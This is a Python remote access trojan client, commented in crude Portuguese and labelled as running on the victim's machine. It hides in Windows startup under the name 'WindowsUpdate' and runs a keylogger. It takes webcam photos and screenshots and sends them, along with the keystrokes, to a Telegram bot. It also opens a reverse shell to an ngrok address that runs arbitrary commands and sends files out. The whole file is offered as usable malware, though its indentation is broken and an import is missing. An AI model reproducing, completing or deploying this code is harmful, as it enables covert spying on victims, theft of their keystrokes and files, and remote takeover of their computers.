# ghostgrab_client.py (roda na VÍTIMA)

import socket
import os
import subprocess
import shutil
import sys
import threading
import json

from pynput.keyboard import Listener as KeyListener
from PIL import ImageGrab # screenshot 
import telebot

# CONFIGURAÇÕES 🔥 ALTERE ISSO!
SERVER_IP = "YOUR_NGROK_TCP_ADDRESS"
SERVER_PORT = 4444 # porta TCP aberta via ngrok

TELEGRAM_BOT_TOKEN = "70XXXXXX:FUCK-YEAH-DATA-COME-IN"
CHAT_ID = "123456789"
bot = telebot.TeleBot(TELEGRAM_BOT_TOKEN)

# INICIO AUTOMÁTICO NO WINDÃO 👿 
def add_to_startup():
    try:
        path = sys.executable
        key = r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run'
        __import__('winreg').SetValue(__import__('winreg').HKEY_CURRENT_USER, key, 'WindowsUpdate', str(path))
    except:
        pass

add_to_startup()

# LIGA A PORRA DA WEBCAM 📸 
def webcam_snap():
    try:
        import cv2 # pip install opencv-python // requer instalação extra mas dá pra bater foto remotamente!
        cam = cv2.VideoCapture(0)
        ret, frame = cam.read()
        if ret:
            cv2.imwrite('webcam.jpg', frame)
            bot.send_photo(CHAT_ID, open('webcam.jpg', 'rb'))
        cam.release()
    except Exception as e:
        bot.send_message(CHAT_ID, f"[WEBCAM ERROR] {e}")

# PRINT DA TELA 💻 
def take_screenshot():
    img = ImageGrab.grab()
    img.save("screen.jpg")
    bot.send_photo(CHAT_ID, open("screen.jpg", "rb"))

# KEYLOGGER FILHO DA PUTA 🔤 
log_data = ""
def on_press(key):
    global log_data
     try :
         log_data += key.char or ''
     except :
         log_data += f' [{str(key)}] '

     if len(log_data) > 100 : # ENVIA A CADA 100 CARACTERES PRA N FICAR BLOQUEANDO TUDO 
         bot.send_message(CHAT_ID , f"[KEYLOG] {log_data}")
         log_data =""

 def start_keylogger():
     from pynput.keyboard import Listener as KeyListener 
     with KeyListener(on_press=on_press ) as listener :
         listener.join()

 threading.Thread(target=start_keylogger , daemon=True ).start()

 # CONEXÃO REVERSA 👹 

 def reverse_shell():
     s= socket.socket(socket.AF_INET , socket.SOCK_STREAM)
     while True :
         try :
             s.connect((SERVER_IP , SERVER_PORT ))
             break 
         except :
             time.sleep(5 )

     while True :
         try :
             cmd= s.recv(1024).decode()
             if cmd.lower()=="exit":break 

             elif cmd=="screen":
                 take_screenshot()
                 continue 

             elif cmd=="webcam":
                 webcam_snap ()
                 continue 

             elif cmd=="download*":
                 filepath=s.recv(1024).decode ()
                 if os.path.exists(filepath ):
                     with open(filepath ,'rb')as f:
                         data=f.read ()
                     s.sendall(data +b"\nEOF\n")
                 else :s.send(b"File not found\nEOF\n")

             else :
                 result=subprocess.run(cmd ,shell=True,capture_output=True,text=True )
                 output=result.stdout+result.stderr 
                 s.send(output.encode ()+b"\nEND\n")

         except Exception as e:
             break 

 reverse_shell ()
